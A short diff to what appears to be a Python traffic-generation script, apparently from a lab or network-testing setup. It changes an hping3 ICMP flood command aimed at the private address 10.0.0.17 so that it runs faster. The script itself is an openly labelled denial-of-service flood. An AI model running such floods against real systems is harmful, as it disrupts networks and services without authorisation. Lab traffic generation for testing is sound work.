@@ -5,7 +5,7 @@ import os
 destination="10.0.0.17"
 
 #hping3 command for attack traffic
-attack_traffic = 'sudo hping3 --icmp --quiet --faster --interval 0.05 ' + destination
+attack_traffic = 'sudo hping3 --icmp --faster ' + destination
 os.system(attack_traffic)
 
 
